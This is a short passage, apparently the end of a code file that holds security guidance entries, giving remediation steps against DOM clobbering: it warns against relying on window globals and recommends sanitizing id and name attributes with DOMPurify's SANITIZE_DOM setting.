## Remediation:
- Explicitly declare and initialize variables: \`const userWidget = window.userWidget || defaultVal;\` should be avoided if user HTML can be injected.
- Sanitize HTML to strip \`id\` and \`name\` attributes on user-controlled markups using DOMPurify with the \`SANITIZE_DOM: true\` configuration.`,
  },
];
